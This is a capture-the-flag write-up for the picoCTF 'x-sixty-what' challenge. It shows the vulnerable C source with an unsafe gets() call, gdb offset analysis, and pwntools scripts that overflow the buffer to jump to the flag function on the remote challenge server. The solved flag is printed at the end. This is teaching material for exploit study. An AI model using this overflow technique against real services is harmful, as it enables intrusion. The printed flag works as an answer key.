# x-sixty-what
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Overflow x64 code 
Most problems before this are 32-bit x86.
Now we'll consider 64-bit x86 which is a little different! 
Overflow the buffer and change the return address to the `flag` function in this [program](https://github.com/jon-brandy/CTF-WRITE-UP/blob/74b33b7a185cb1fe916b413629149156f6765323/Asset/x-sixty-what/vuln). 
Download [source](https://github.com/jon-brandy/CTF-WRITE-UP/blob/74b33b7a185cb1fe916b413629149156f6765323/Asset/x-sixty-what/vuln.c). `nc saturn.picoctf.net 59713`
## HINTS:
1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2. Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
## STEPS:
1. First, download both files given.
2. Next, let's whether the `program` file is stripped or not.

![image](https://user-images.githubusercontent.com/70703371/188832877-c1e6aeae-c8aa-4c98-acd2-f12fcde02077.png)

3. Great! Since it's not stripped so we can see all the functions name.
4. Now let's check the file protection.

![image](https://user-images.githubusercontent.com/70703371/188836157-9252437e-dff0-41d5-960b-45c88ed21166.png)

5. **No pie** and **no canary**, seems we can use the same method as usual.
6. But let's run the program, but make it executeable first by run -> `chmod +x vuln`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/188836557-0d6a510f-3c51-48c1-96bf-eddbfb322dc9.png)

7. Now let's analyze the source code.

> VULN.C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}

```

8. At the `vuln()` function, we can take advantage of the `gets()` function to do bufferoverflow.

![image](https://user-images.githubusercontent.com/70703371/188837621-3209223f-60c9-42ff-af39-eda4e688d98e.png)

9. Since we can't see what address we jumped to, let's run the program using gdb and create pattern of strings.

![image](https://user-images.githubusercontent.com/70703371/188853146-978f0577-35e5-49e4-9271-3b2328640110.png)

10. Copy the strings, now run the program and paste the strings as input.

> RESULTS

![image](https://user-images.githubusercontent.com/70703371/188853468-31758b86-5ddf-4dc3-a559-9cae8b4559fd.png)

![image](https://user-images.githubusercontent.com/70703371/188853500-d2c10f45-f3b0-442e-8a8a-bf6c7e2f81f2.png)

11. Notice here, somehow **rip** does not have our input.

![image](https://user-images.githubusercontent.com/70703371/188854058-6e90c4d1-ba23-47ff-8ad5-c17670eb579a.png)

12. Let's see the pattern offset of **rsp** so we know the correct buffer.

![image](https://user-images.githubusercontent.com/70703371/188879246-34429dbe-e046-45a3-bbb3-42f0f78ebe94.png)

13. Hmm 72 for little endian.
14. Now we just need to find the `flag()` function's address.

![image](https://user-images.githubusercontent.com/70703371/188879464-7b9a2a3d-a657-4a2f-a336-875fb0a02f88.png)

```
address -> 0x401236
```

15. So i made a script in python to solve this, notice the concept is similiar to **ret2win**.

```py
from pwn import *
import os

os.system('clear')

addrFlag = 0x401236

sh = remote('saturn.picoctf.net', 56872)

p = b'A' * 72 # pattern offset of $rsp
p += p64(4198966) # flag address to decimal value

sh.recvuntil('\n')
sh.sendline(p)

sh.interactive()
```


![image](https://user-images.githubusercontent.com/70703371/188879874-e32fe1f7-3aa5-4668-855d-b4daec80c64c.png)


16. Got EOF, kinda confused why.
17. I think for the padding absolutely correct, might be the address not.
18. So i tried to disassmble the `flag()` function using gdb.

![image](https://user-images.githubusercontent.com/70703371/188880194-cd0cc8a1-a0bf-4582-9922-cf0caebe88ac.png)

19. Let's try this address, since it the data copied to rsp.

> NOTES

```
mov means in assembly -> The mov instruction copies the data item referred to by its second operand
```

![image](https://user-images.githubusercontent.com/70703371/188880448-6a21253f-2570-4dc9-94e1-c7783133039e.png)

> FINAL SCRIPT

```py
from pwn import *
import os

os.system('clear')

addrFlag = 0x000000000040123b

sh = remote('saturn.picoctf.net', 56872)

p = b'A' * 72 # pattern offset of $rsp
p += p64(4198971) # flag address to decimal value

sh.recvuntil('\n')
sh.sendline(p)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/188881487-1dfaf87a-af88-40f9-82ae-8076b2216d74.png)

20. Finally, we got the flag!

## FLAG

```
picoCTF{b1663r_15_b3773r_964d9987}
```

## LEARNING REFERENCES:

```
https://www.felixcloutier.com/x86/mov
```

